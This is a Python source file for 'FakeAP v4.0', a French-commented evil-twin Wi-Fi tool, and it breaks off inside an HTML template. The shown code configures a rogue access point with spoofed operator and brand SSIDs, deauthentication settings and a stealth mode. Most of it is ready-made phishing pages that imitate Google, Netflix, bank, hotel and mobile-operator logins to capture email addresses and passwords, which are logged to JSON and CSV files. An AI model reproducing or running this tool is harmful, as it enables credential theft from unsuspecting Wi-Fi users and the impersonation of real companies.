#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════╗
# ║         FakeAP v4.0 — Portail Captif Avancé             ║
# ║         Créateur : ML  |  Style : Hacker Cinema         ║
# ╚══════════════════════════════════════════════════════════╝

import os, sys, time, signal, random, subprocess, threading, re, csv, json, socket, select
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse, unquote
from datetime import datetime
from collections import defaultdict, Counter

# ═══════════════════════════════════════════════════════════
#  CONFIG PAR DÉFAUT
# ═══════════════════════════════════════════════════════════
INTERFACE    = "wlp2s0"
GATEWAY_IP   = "192.168.10.1"
NETMASK      = "24"
DHCP_START   = "192.168.10.100"
DHCP_END     = "192.168.10.200"
DHCP_LEASE   = "12h"
DNS_SERVER   = "192.168.10.1"
CHANNEL      = "6"
REDIRECT_URL = "https://www.google.com"

CURRENT_INTERFACE   = INTERFACE
CURRENT_GATEWAY     = GATEWAY_IP
CURRENT_NETMASK     = NETMASK
CURRENT_DHCP_START  = DHCP_START
CURRENT_DHCP_END    = DHCP_END
CURRENT_DHCP_LEASE  = DHCP_LEASE
CURRENT_DNS         = DNS_SERVER
CURRENT_CHANNEL     = CHANNEL
CURRENT_REDIRECT    = REDIRECT_URL

# ── Interfaces (1 ou 2 cartes)
INTERFACE_AP      = INTERFACE   # Interface pour le point d'accès
INTERFACE_DEAUTH  = INTERFACE   # Interface pour deauth (même si 1 seule carte)
DUAL_CARD_MODE    = False       # True si 2 cartes détectées

# ── Sécurité / Filtrage
WHITELIST_MAC     = set()       # MACs jamais capturés
BLOCKED_IPS       = set()       # IPs bloquées (iptables + HTTP 403)
ATTEMPT_COUNTER   = defaultdict(int)  # IP → nb tentatives
MAX_ATTEMPTS      = 3           # Max tentatives avant blocage
BLOCK_AFTER_CAP   = False       # Bloquer l'IP après 1ère capture

# ── Mode AP
AP_AUTH_MODE      = "open"      # "open" ou "wpa2"
AP_WPA_PASS       = "12345678"  # Mot de passe fake WPA2

# ── Options avancées
STEALTH_MODE      = False       # Réduire les logs visibles
WATCHDOG_RUNNING  = False       # Thread watchdog actif
DEAUTH_CONTINUOUS = False       # Deauth en boucle continue
DEAUTH_RUNNING    = False
DEAUTH_THREAD     = None
CONTINUOUS_DEAUTH_TARGET = None  # {'bssid':..., 'ssid':..., 'interface':...}

# ── Logs
HTTP_LOG_ENABLED  = True
HTTP_LOG_FILE     = "http_requests.log"
CAPTURES_FILE     = "captures.json"
CSV_FILE          = "captures.csv"
PROFILES_DIR      = "fakeap_profiles"

# ── Stats live
LIVE_STATS        = {'captures': 0, 'clients': set(), 'requests': 0, 'start_time': None}
STATS_LOCK        = threading.Lock()

# ── Pages
SELECTED_PAGE     = None
SELECTED_SSID     = "Airtel_Free_WiFi"
SELECTED_FILE     = "airtel.html"

# ═══════════════════════════════════════════════════════════
#  PAGES DISPONIBLES
# ═══════════════════════════════════════════════════════════
PAGES = {
    1:  {"file": "facebook.html",   "name": "Facebook WiFi",    "ssid": "Facebook_Free_WiFi",  "color": "#4267B2"},
    2:  {"file": "tiktok.html",     "name": "TikTok Hotspot",   "ssid": "TikTok_Free_WiFi",    "color": "#000000"},
    3:  {"file": "airtel.html",     "name": "Airtel Free WiFi", "ssid": "Airtel_Free_WiFi",    "color": "#e3000b"},
    4:  {"file": "instagram.html",  "name": "Instagram Zone",   "ssid": "Instagram_WiFi",      "color": "#E4405F"},
    5:  {"file": "windows.html",    "name": "Windows Update",   "ssid": "Windows_Update",      "color": "#0078D7"},
    6:  {"file": "whatsapp.html",   "name": "WhatsApp Connect", "ssid": "WhatsApp_WiFi",       "color": "#25D366"},
    7:  {"file": "telegram.html",   "name": "Telegram Access",  "ssid": "Telegram_WiFi",       "color": "#0088CC"},
    8:  {"file": "canalbox.html",   "name": "CanalBox WiFi",    "ssid": "CanalBox_WiFi",       "color": "#FF6600"},
    9:  {"file": "orange.html",     "name": "Orange Freebox",   "ssid": "Orange_Free_WiFi",    "color": "#FF7900"},
    10: {"file": "vodacom.html",    "name": "Vodacom Network",  "ssid": "Vodacom_WiFi",        "color": "#E60000"},
    13: {"file": "wifitoo.html",    "name": "WiFiToo Clone",    "ssid": "WiFiToo_Free",        "color": "#00FF00"},
    # ── Nouvelles pages inline (pas besoin de fichier HTML)
    14: {"file": "__google__",      "name": "Google Account",   "ssid": "Google_Starbucks",    "color": "#4285F4"},
    15: {"file": "__netflix__",     "name": "Netflix Portal",   "ssid": "Netflix_WiFi",        "color": "#E50914"},
    16: {"file": "__bank__",        "name": "Banque en ligne",  "ssid": "BNP_Free_WiFi",       "color": "#003087"},
    17: {"file": "__hotel__",       "name": "Hotel WiFi",       "ssid": "Hotel_Premium_WiFi",  "color": "#B8860B"},
    18: {"file": "__operator__",    "name": "Opérateur Mobile", "ssid": "Orange_4G_WiFi",      "color": "#FF7900"},
}

REDIRECT_PAGES = {
    1: {"name": "Google",       "url": "https://www.google.com"},
    2: {"name": "Facebook",     "url": "https://www.facebook.com"},
    3: {"name": "YouTube",      "url": "https://www.youtube.com"},
    4: {"name": "Twitter/X",    "url": "https://twitter.com"},
    5: {"name": "Instagram",    "url": "https://www.instagram.com"},
    6: {"name": "Personnalisé", "url": ""},
    7: {"name": "WiFiToo Page", "url": "http://192.168.10.1/wifitoo.html"},
}

# Générateur de SSID aléatoire — opérateurs réels
SSID_TEMPLATES = {
    "SFR":      ["SFR_{:04X}",        "SFR-Box-{:04X}",    "SFR_{:06X}"],
    "Bbox":     ["Bbox-{:04X}",       "BBox-{:06X}",       "Bbox-{:04X}-2.4G"],
    "Orange":   ["Orange-{:04X}",     "Livebox-{:04X}",    "OrangeFiber_{:04X}"],
    "Free":     ["Freebox-{:04X}",    "Free-{:04X}",       "FreeWifi_{:06X}"],
    "Bouygues": ["bbox{:04X}",        "Bouygues-{:04X}",   "BBox3-{:04X}"],
    "Public":   ["WiFi_Public_{:04X}","FreeWiFi_{:06X}",   "HotSpot_{:04X}"],
    "Hotel":    ["Hotel_WiFi_{:04X}", "GuestNet_{:04X}",   "Premium_WiFi_{:04X}"],
    "Airtel":   ["Airtel_{:04X}G",    "Airtel_Home_{:04X}","Airtel_Fiber_{:04X}"],
    "MTN":      ["MTN_WiFi_{:04X}",   "MTN_{:04X}",        "MTN_Home_{:04X}"],
    "Vodacom":  ["Vodacom_{:04X}",    "Voda_WiFi_{:04X}",  "VodaNet_{:04X}"],
}

# ═══════════════════════════════════════════════════════════
#  COULEURS & CLASSES UTILITAIRES
# ═══════════════════════════════════════════════════════════
class C:
    RED    = '\033[91m'; GREEN  = '\033[92m'; YELLOW = '\033[93m'
    CYAN   = '\033[96m'; PURPLE = '\033[95m'; BLUE   = '\033[94m'
    WHITE  = '\033[97m'; BLACK  = '\033[90m'; BOLD   = '\033[1m'
    DIM    = '\033[2m';  BLINK  = '\033[5m';  UNDER  = '\033[4m'
    REV    = '\033[7m';  END    = '\033[0m'
    MATRIX = '\033[92m\033[1m'
    ALERT  = '\033[91m\033[1m[!] '; OK   = '\033[92m\033[1m[✓] '
    INFO   = '\033[96m\033[1m[*] '; WARN = '\033[93m\033[1m[!] '
    PROMPT = '\033[95m\033[1m[?] '

GLITCH_CHARS = "▓▒░█▄▀▌▐╬╫╪╩╦╠═╗╔╝╚║"
MATRIX_CHARS = "ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀ0123456789ABCDEF"

# ═══════════════════════════════════════════════════════════
#  EFFETS TERMINAL / CINEMA
# ═══════════════════════════════════════════════════════════
def clear_screen():       os.system('clear')
def hide_cursor():        sys.stdout.write('\033[?25l'); sys.stdout.flush()
def show_cursor():        sys.stdout.write('\033[?25h'); sys.stdout.flush()
def sound_alert():        sys.stdout.write('\a'); sys.stdout.flush()

def typewriter(text, color=C.GREEN, delay=0.025, newline=True):
    sys.stdout.write(color)
    for ch in text:
        sys.stdout.write(ch); sys.stdout.flush(); time.sleep(delay)
    sys.stdout.write(C.END)
    if newline: sys.stdout.write('\n')
    sys.stdout.flush()

def glitch_text(text, color=C.GREEN, iterations=4, delay=0.04):
    for _ in range(iterations):
        corrupted = ''.join(random.choice(GLITCH_CHARS) if random.random() < 0.25 else ch for ch in text)
        sys.stdout.write(f'\r{color}{corrupted}{C.END}'); sys.stdout.flush(); time.sleep(delay)
    sys.stdout.write(f'\r{color}{text}{C.END}\n'); sys.stdout.flush()

def progress_bar(label, total=30, color=C.GREEN, char_fill='█', char_empty='░', delay=0.04):
    sys.stdout.write(f'{color}{C.BOLD}')
    for i in range(total + 1):
        pct = int((i / total) * 100)
        bar = f'\r  {label} [{char_fill*i}{C.DIM}{char_empty*(total-i)}{C.END}{color}{C.BOLD}] {pct:3d}%'
        sys.stdout.write(bar); sys.stdout.flush(); time.sleep(delay)
    sys.stdout.write(f'{C.END}\n'); sys.stdout.flush()

def spinner(label, duration=1.5, color=C.CYAN):
    frames = ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏']
    t_end = time.time() + duration; i = 0
    while time.time() < t_end:
        sys.stdout.write(f'\r{color}{C.BOLD}  {frames[i%len(frames)]}  {label}{C.END}')
        sys.stdout.flush(); time.sleep(0.1); i += 1
    sys.stdout.write(f'\r{C.OK}{label}{C.END}          \n'); sys.stdout.flush()

def scan_animation(label="SCAN", duration=2.5):
    signals = ['▁','▂','▃','▄','▅','▆','▇','█','▇','▆','▅','▄','▃','▂','▁']
    t_end = time.time() + duration; i = 0
    while time.time() < t_end:
        bar = ''.join(f'{C.GREEN}{signals[(i+j)%len(signals)]}{C.END}' for j in range(20))
        sys.stdout.write(f'\r  {C.CYAN}{C.BOLD}[{label}]{C.END}  {bar}  ')
        sys.stdout.flush(); time.sleep(0.07); i += 1
    sys.stdout.write('\n'); sys.stdout.flush()

def hex_dump_animation(lines=3, delay=0.07):
    for _ in range(lines):
        addr  = f"{random.randint(0,0xFFFF):04X}"
        hexb  = " ".join(f"{random.randint(0,255):02X}" for _ in range(16))
        ascii_= "".join(chr(random.randint(33,126)) for _ in range(16))
        print(f"  {C.BLACK}{C.BOLD}0x{addr}{C.END}  {C.GREEN}{hexb}{C.END}  {C.DIM}|{ascii_}|{C.END}")
        time.sleep(delay)

def boot_sequence():
    clear_screen(); hide_cursor()
    boot_lines = [
        (f"  {C.GREEN}[  0.000000]{C.END} BIOS v4.0 — FakeAP Kernel 5.15.0-ML"),
        (f"  {C.GREEN}[  0.112341]{C.END} Initializing IEEE 802.11 wireless drivers"),
        (f"  {C.GREEN}[  0.223410]{C.END} nl80211: MAC80211 HW init {C.CYAN}[wlp2s0]{C.END}"),
        (f"  {C.GREEN}[  0.334521]{C.END} hostapd daemon        : {C.YELLOW}READY{C.END}"),
        (f"  {C.GREEN}[  0.445632]{C.END} dnsmasq DHCP/DNS      : {C.YELLOW}READY{C.END}"),
        (f"  {C.GREEN}[  0.556743]{C.END} HTTP portal engine    : {C.YELLOW}STANDBY{C.END}"),
        (f"  {C.GREEN}[  0.667854]{C.END} Multi-lang detector   : {C.YELLOW}LOADED{C.END}"),
        (f"  {C.GREEN}[  0.778965]{C.END} Watchdog & stealth    : {C.YELLOW}READY{C.END}"),
        (f"  {C.YELLOW}[  0.889076]{C.END} {C.BOLD}FakeAP v4.0{C.END} core    : {C.GREEN}ONLINE{C.END}"),
    ]
    for line in boot_lines:
        typewriter(line, color='', delay=0.02, newline=False); time.sleep(0.04); print(f'  {C.GREEN}✓{C.END}')
    time.sleep(0.3); show_cursor()

# ─────────────────────────────────────────────
#  BANNIÈRE
# ─────────────────────────────────────────────
def print_banner():
    clear_screen(); hide_cursor()
    for _ in range(2):
        print(''.join(f'{C.GREEN}{C.DIM}{random.choice("01▓▒░")}{C.END}' if random.random()<0.12 else ' ' for _ in range(80)))
        time.sleep(0.04)
    art = [
        r"  ███████╗ █████╗ ██╗  ██╗███████╗ █████╗ ██████╗ ",
        r"  ██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗██╔══██╗",
        r"  █████╗  ███████║█████╔╝ █████╗  ███████║██████╔╝",
        r"  ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██║██╔═══╝ ",
        r"  ██║     ██║  ██║██║  ██╗███████╗██║  ██║██║     ",
        r"  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ",
    ]
    for line in art:
        if random.random() < 0.3:
            g = ''.join(random.choice(GLITCH_CHARS) if random.random()<0.08 else ch for ch in line)
            print(f'{C.GREEN}{C.BOLD}{g}{C.END}'); time.sleep(0.03)
            print(f'\033[1A{C.GREEN}{C.BOLD}{line}{C.END}')
        else:
            print(f'{C.GREEN}{C.BOLD}{line}{C.END}')
        time.sleep(0.05)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    dual = f"{C.CYAN}  2-CARTES{C.END}" if DUAL_CARD_MODE else f"{C.BLACK}  1-CARTE {C.END}"
    stealth = f"{C.RED}  STEALTH{C.END}" if STEALTH_MODE else ""
    print()
    print(f'  {C.GREEN}{C.BOLD}{"═"*60}{C.END}')
    print(f'  {C.CYAN}TOOL    {C.END}: {C.WHITE}{C.BOLD}FakeAP v4.0{C.END}  {C.DIM}— Captive Portal Engine{C.END}')
    print(f'  {C.CYAN}CREATOR {C.END}: {C.YELLOW}{C.BOLD}ML{C.END}        {C.DIM}Mode:{C.END}{dual}{stealth}')
    print(f'  {C.CYAN}STATUS  {C.END}: {C.GREEN}{C.BOLD}● ONLINE{C.END}   {C.DIM}{now}{C.END}')
    print(f'  {C.GREEN}{C.BOLD}{"═"*60}{C.END}')
    print(); show_cursor()

# ─────────────────────────────────────────────
#  HELPERS UI
# ─────────────────────────────────────────────
def print_header(title, color=C.CYAN):
    w = 66
    print(f"\n  {color}{C.BOLD}╔{'═'*w}╗{C.END}")
    print(f"  {color}{C.BOLD}║{C.END}{C.WHITE}{C.BOLD}  {title.upper().center(w-2)}{C.END}{color}{C.BOLD}  ║{C.END}")
    print(f"  {color}{C.BOLD}╚{'═'*w}╝{C.END}")

def print_section(title, color=C.GREEN):
    print(f"\n  {color}┌{'─'*58}┐{C.END}")
    print(f"  {color}│{C.END}{C.CYAN}{C.BOLD}  {title.center(56)}{C.END}{color}  │{C.END}")
    print(f"  {color}└{'─'*58}┘{C.END}")

def divider(char='─', color=C.GREEN, w=68):
    print(f"  {color}{char*w}{C.END}")

def print_menu_item(num, text, status="active", current=""):
    dot = f"{C.GREEN}●{C.END}" if status == "active" else f"{C.RED}○{C.END}"
    col = C.WHITE if status == "active" else f"{C.BLACK}{C.DIM}"
    cur = f"  {C.CYAN}↳ {current[:45]}{C.END}" if current else ""
    print(f"  {dot} {C.YELLOW}{C.BOLD}[{num:>2}]{C.END}  {col}{text}{C.END}{cur}")

# ═══════════════════════════════════════════════════════════
#  PAGES HTML INLINE (aucun fichier externe requis)
# ═══════════════════════════════════════════════════════════

LANG_STRINGS = {
    'fr': {
        'google':   ('Connexion', 'Adresse e-mail ou téléphone', 'Mot de passe', 'Suivant', 'Connexion - Comptes Google'),
        'netflix':  ('Se connecter', 'Adresse e-mail ou numéro de téléphone', 'Mot de passe', 'Se connecter', 'Netflix'),
        'bank':     ('Connexion Banque', 'Identifiant client', 'Mot de passe', 'Valider', 'Espace Client'),
        'hotel':    ('Connexion WiFi', 'Numéro de chambre', 'Nom de famille', 'Se connecter', 'Hotel WiFi Portal'),
        'operator': ('Connexion', 'Email / Numéro de mobile', 'Mot de passe', 'Se connecter', 'Espace Client'),
        'loading':  ('Connexion en cours...', 'Vérification de votre accès', 'Connexion établie !', 'Redirection...'),
        'blocked':  ('Accès refusé', 'Trop de tentatives. Réessayez plus tard.'),
        'success':  ('Connexion réussie', 'Accès Internet activé.', 'Redirection dans'),
        'wpa2_hint': 'Votre session WiFi a expiré. Reconnectez-vous.',
    },
    'en': {
        'google':   ('Sign in', 'Email or phone', 'Password', 'Next', 'Sign in - Google Accounts'),
        'netflix':  ('Sign In', 'Email or phone number', 'Password', 'Sign In', 'Netflix'),
        'bank':     ('Bank Login', 'Customer ID', 'Password', 'Submit', 'Online Banking'),
        'hotel':    ('WiFi Login', 'Room number', 'Last name', 'Connect', 'Hotel WiFi Portal'),
        'operator': ('Sign In', 'Email / Mobile number', 'Password', 'Sign In', 'My Account'),
        'loading':  ('Connecting...', 'Verifying your access', 'Connection established!', 'Redirecting...'),
        'blocked':  ('Access Denied', 'Too many attempts. Please try again later.'),
        'success':  ('Connected', 'Internet access granted.', 'Redirecting in'),
        'wpa2_hint': 'Your WiFi session has expired. Please reconnect.',
    },
    'es': {
        'google':   ('Iniciar sesión', 'Correo o teléfono', 'Contraseña', 'Siguiente', 'Iniciar sesión - Google'),
        'netflix':  ('Iniciar sesión', 'Correo o número de teléfono', 'Contraseña', 'Iniciar sesión', 'Netflix'),
        'bank':     ('Banca Online', 'Usuario', 'Contraseña', 'Entrar', 'Mi Banco'),
        'hotel':    ('WiFi Hotel', 'Número de habitación', 'Apellido', 'Conectar', 'Portal WiFi Hotel'),
        'operator': ('Acceder', 'Email / Móvil', 'Contraseña', 'Acceder', 'Mi Cuenta'),
        'loading':  ('Conectando...', 'Verificando acceso', '¡Conexión establecida!', 'Redirigiendo...'),
        'blocked':  ('Acceso denegado', 'Demasiados intentos. Inténtelo más tarde.'),
        'success':  ('Conectado', 'Acceso a Internet activado.', 'Redirigiendo en'),
        'wpa2_hint': 'Su sesión WiFi ha caducado. Por favor, vuelva a conectarse.',
    },
    'pt': {
        'google':   ('Fazer login', 'Email ou telefone', 'Senha', 'Próximo', 'Fazer login - Google'),
        'netflix':  ('Entrar', 'Email ou número de telefone', 'Senha', 'Entrar', 'Netflix'),
        'bank':     ('Login Banco', 'Identificador', 'Senha', 'Entrar', 'Área do Cliente'),
        'hotel':    ('WiFi Hotel', 'Número do quarto', 'Apelido', 'Ligar', 'Portal WiFi Hotel'),
        'operator': ('Entrar', 'Email / Telemóvel', 'Senha', 'Entrar', 'A Minha Conta'),
        'loading':  ('A ligar...', 'A verificar o seu acesso', 'Ligação estabelecida!', 'A redirecionar...'),
        'blocked':  ('Acesso negado', 'Demasiadas tentativas. Tente mais tarde.'),
        'success':  ('Ligado', 'Acesso à Internet ativado.', 'A redirecionar em'),
        'wpa2_hint': 'A sua sessão WiFi expirou. Por favor, volte a ligar-se.',
    },
}

def detect_language(headers):
    """Détecter la langue depuis Accept-Language header"""
    lang_header = headers.get('Accept-Language', 'fr')
    for supported in ['fr', 'en', 'es', 'pt']:
        if supported in lang_header[:5].lower():
            return supported
    return 'fr'

def get_lang(lang, key):
    return LANG_STRINGS.get(lang, LANG_STRINGS['fr']).get(key, LANG_STRINGS['fr'].get(key, ('',)*5))

# ── Page chargement animé
def loading_page_html(lang, redirect_to="/"):
    t = get_lang(lang, 'loading')
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>{t[0]}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#0a0a0a;font-family:'Courier New',monospace;
     display:flex;justify-content:center;align-items:center;
     height:100vh;color:#00ff41;overflow:hidden}}
.wrap{{text-align:center}}
.logo{{font-size:48px;margin-bottom:20px;animation:pulse 1.5s infinite}}
@keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:.3}}}}
.msg{{font-size:14px;letter-spacing:3px;color:#00cc33;margin-bottom:30px}}
.bar-wrap{{width:300px;height:4px;background:#001a00;border-radius:2px;margin:0 auto 20px}}
.bar{{height:4px;background:#00ff41;border-radius:2px;animation:load 2.8s ease forwards}}
@keyframes load{{0%{{width:0%}}100%{{width:100%}}}}
.sub{{font-size:11px;color:#005010;letter-spacing:2px;animation:blink 1s step-end infinite}}
@keyframes blink{{50%{{opacity:0}}}}
</style>
<script>setTimeout(()=>window.location.href='{redirect_to}', 3000);</script>
</head><body>
<div class="wrap">
  <div class="logo">📶</div>
  <div class="msg">{t[1].upper()}</div>
  <div class="bar-wrap"><div class="bar"></div></div>
  <div class="sub">{t[3]}</div>
</div></body></html>"""

# ── Google
def google_page_html(lang, wpa2_hint=False):
    t = get_lang(lang, 'google')
    hint = f'<p style="color:#d93025;font-size:13px;margin-bottom:12px">{get_lang(lang,"wpa2_hint")}</p>' if wpa2_hint else ''
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{t[4]}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;
     display:flex;justify-content:center;align-items:center;min-height:100vh;color:#202124}}
.card{{width:450px;padding:48px 40px;border:1px solid #dadce0;border-radius:8px;text-align:center}}
.glogo{{font-size:36px;letter-spacing:-2px;margin-bottom:8px}}
.g{{color:#4285F4}}  .o1{{color:#EA4335}} .o2{{color:#FBBC05}} .l{{color:#34A853}} .e{{color:#EA4335}}
h1{{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124}}
.sub{{font-size:16px;color:#202124;margin-bottom:24px}}
input{{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;
       font-size:16px;outline:none;margin:8px 0;color:#202124}}
input:focus{{border-color:#4285F4;box-shadow:0 0 0 2px rgba(66,133,244,.2)}}
.btn{{width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;
      border-radius:4px;font-size:14px;cursor:pointer;margin-top:16px;font-weight:500}}
.btn:hover{{background:#1557b0}}
.footer{{margin-top:20px;font-size:12px;color:#5f6368}}
</style></head><body>
<div class="card">
  <div class="glogo"><span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g">g</span><span class="l">l</span><span class="e">e</span></div>
  <h1>{t[0]}</h1>
  <p class="sub">{hint}Utilisez votre compte Google</p>
  <form method="POST">
    <input type="text" name="email" placeholder="{t[1]}" required autocomplete="off">
    <input type="password" name="password" placeholder="{t[2]}" required>
    <button class="btn" type="submit">{t[3]}</button>
  </form>
  <div class="footer">FakeAP — ML © {datetime.now().year}</div>
</div></body></html>"""

# ── Netflix
def netflix_page_html(lang, wpa2_hint=False):
    t = get_lang(lang, 'netflix')
    hint = f'<p style="color:#e50914;font-size:13px;margin-bottom:12px;background:rgba(229,9,20,.1);padding:8px;border-radius:4px">{get_lang(lang,"wpa2_hint")}</p>' if wpa2_hint else ''
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{t[4]}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#000 url('') center/cover;font-family:'Helvetica Neue',Arial,sans-serif;
     display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}}
.overlay{{background:rgba(0,0,0,.75);padding:60px 68px;border-radius:4px;width:450px}}
.nlogo{{color:#e50914;font-size:32px;font-weight:900;letter-spacing:-1px;margin-bottom:28px}}
h1{{font-size:32px;font-weight:700;margin-bottom:28px}}
input{{width:100%;padding:16px 20px;background:rgba(22,22,22,.7);border:1px solid rgba(255,255,255,.15);
       border-radius:4px;color:#fff;font-size:16px;margin-bottom:16px;outline:none}}
input::placeholder{{color:#8c8c8c}}
input:focus{{border-color:#e50914;background:rgba(40,40,40,.7)}}
.btn{{width:100%;padding:16px;background:#e50914;color:#fff;border:none;border-radius:4px;
      font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}}
.btn:hover{{background:#c2080f}}
.footer{{margin-top:16px;font-size:12px;color:#737373;text-align:center}}
</style></head><body>
<div class="overlay">
  <div class="nlogo">NETFLIX</div>
  {hint}
  <h1>{t[0]}</h1>
  <form method="POST">
    <input type="text" name="email" placeholder="{t[1]}" required autocomplete="off">
    <input type="password" name="password" placeholder="{t[2]}" required>
    <button class="btn" type="submit">{t[3]}</button>
  </form>
  <div class="footer">FakeAP — ML © {datetime.now().year}</div>
</div></body></html>"""

# ── Banque
def bank_page_html(lang, wpa2_hint=False):
    t = get_lang(lang, 'bank')
    hint = f'<div style="background:#fff3cd;border:1px solid #ffc107;padding:10px;border-radius:4px;margin-bottom:16px;font-size:13px;color:#856404">{get_lang(lang,"wpa2_hint")}</div>' if wpa2_hint else ''
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{t[4]}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:linear-gradient(135deg,#003087 0%,#0050a0 100%);
     font-family:Arial,sans-serif;display:flex;justify-content:center;
     align-items:center;min-height:100vh;color:#fff}}
.card{{background:#fff;color:#333;width:420px;border-radius:8px;
       box-shadow:0 20px 60px rgba(0,0,0,.3);overflow:hidden}}
.header{{background:#003087;padding:24px 32px;color:#fff}}
.header h1{{font-size:22px;font-weight:700;margin-bottom:4px}}
.header p{{font-size:13px;opacity:.8}}
.body{{padding:32px}}
label{{display:block;font-size:13px;font-weight:600;color:#666;
       margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}}
input{{width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;
       font-size:15px;margin-bottom:20px;color:#333;outline:none}}
input:focus{{border-color:#003087}}
.btn{{width:100%;padding:14px;background:#003087;color:#fff;border:none;
      border-radius:4px;font-size:15px;font-weight:700;cursor:pointer}}
.btn:hover{{background:#002060}}
.secure{{display:flex;align-items:center;gap:8px;margin-top:16px;
          font-size:12px;color:#888}}
.footer{{font-size:11px;color:#aaa;text-align:center;margin-top:12px}}
</style></head><body>
<div class="card">
  <div class="header"><h1>🏦 {t[4]}</h1><p>Connexion sécurisée — SSL</p></div>
  <div class="body">
    {hint}
    <form method="POST">
      <label>{t[1]}</label>
      <input type="text" name="username" required autocomplete="off">
      <label>{t[2]}</label>
      <input type="password" name="password" required>
      <button class="btn" type="submit">{t[3]}</button>
    </form>
    <div class="secure">🔒 Connexion sécurisée 256-bit SSL</div>
    <div class="footer">FakeAP — ML © {datetime.now().year}</div>
  </div>
</div></body></html>"""

# ── Hotel
def hotel_page_html(lang, ssid="Hotel_WiFi", wpa2_hint=False):
    t = get_lang(lang, 'hotel')
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{t[4]}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
     font-family:'Segoe UI',Arial,sans-serif;display:flex;
     justify-content:center;align-items:center;min-height:100vh}}
.card{{background:rgba(255,255,255,.95);width:420px;border-radius:16px;
       padding:48px 40px;text-align:center;
       box-shadow:0 25px 60px rgba(0,0,0,.2)}}
.icon{{font-size:48px;margin-bottom:12px}}
h1{{font-size:26px;color:#2d3748;margin-bottom:6px;font-weight:700}}
.sub{{font-size:14px;color:#718096;margin-bottom:30px}}
.network{{background:#f0f4ff;border:1px solid #c3d3ff;border-radius:8px;
           padding:8px 16px;font-size:13px;color:#3b5bdb;margin-bottom:24px;
           font-family:'Courier New',monospace}}
input{{width:100%;padding:14px;border:1px solid #e2e8f0;border-radius:8px;
       font-size:15px;margin-bottom:14px;color:#2d3748;outline:none}}
input:focus{{border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,.15)}}
.btn{{width:100%;padding:15px;background:linear-gradient(135deg,#667eea,#764ba2);
      color:#fff;border:none;border-radius:8px;font-size:16px;
      font-weight:600;cursor:pointer}}
.footer{{margin-top:20px;font-size:11px;color:#cbd5e0}}
</style></head><body>
<div class="card">
  <div class="icon">🏨</div>
  <h1>{t[0]}</h1>
  <p class="sub">{t[4]}</p>
  <div class="network">📶 {ssid}</div>
  <form method="POST">
    <input type="text" name="username" placeholder="{t[1]}" required autocomplete="off">
    <input type="password" name="password" placeholder="{t[2]}" required>
    <button class="btn" type="submit">{t[3]}</button>
  </form>
  <div class="footer">FakeAP — ML © {datetime.now().year}</div>
</div></body></html>"""

# ── Opérateur
def operator_page_html(lang, ssid="Operator_WiFi", wpa2_hint=False):
    t = get_lang(lang, 'operator')
    brand_colors = {"orange": "#FF7900", "sfr": "#e2001a", "free": "#cd0d10",
                    "mtn": "#FFCC00", "airtel": "#e3000b", "vodacom": "#E60000"}
    color = "#FF7900"
    for brand, c in brand_colors.items():
        if brand in ssid.lower():
            color = c; break
    hint = f'<p style="color:{color};font-size:13px;margin-bottom:16px;font-weight:600">{get_lang(lang,"wpa2_hint")}</p>' if wpa2_hint else ''
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{t[4]}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#f5f5f5;font-family:Arial,sans-serif;
     display:flex;justify-content:center;align-items:center;min-height:100vh}}
.card{{background:#fff;width:420px;border-radius:4px;
       box-shadow:0 2px 20px rgba(0,0,0,.1);overflow:hidden}}
.header{{background:{color};padding:20px 24px;color:#fff}}
.header h1{{font-size:20px;font-weight:700}}
.header p{{font-size:13px;opacity:.9;margin-top:4px}}
.body{{padding:30px 24px}}
input{{width:100%;padding:13px;border:1px solid #ddd;border-radius:4px;
       font-size:15px;margin-bottom:16px;color:#333;outline:none}}
input:focus{{border-color:{color};box-shadow:0 0 0 2px {color}33}}
.btn{{width:100%;padding:14px;background:{color};color:#fff;border:none;
      border-radius:4px;font-size:15px;font-weight:700;cursor:pointer}}
.footer{{font-size:11px;color:#aaa;text-align:center;padding:12px}}
</style></head><body>
<div class="card">
  <div class="header"><h1>📡 {t[4]}</h1><p>{ssid}</p></div>
  <div class="body">
    {hint}
    <form method="POST">
      <input type="text" name="email" placeholder="{t[1]}" required autocomplete="off">
      <input type="password" name="password" placeholder="{t[2]}" required>
      <button class="btn" type="submit">{t[3]}</button>
    </form>
  </div>
  <div class="footer">FakeAP — ML © {datetime.now().year}</div>
</div></body></html>"""

# ── WiFiToo (terminal dark)
def wifitoo_page_html(lang, ssid="WiFiToo"):
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>WiFi — Connexion</title>
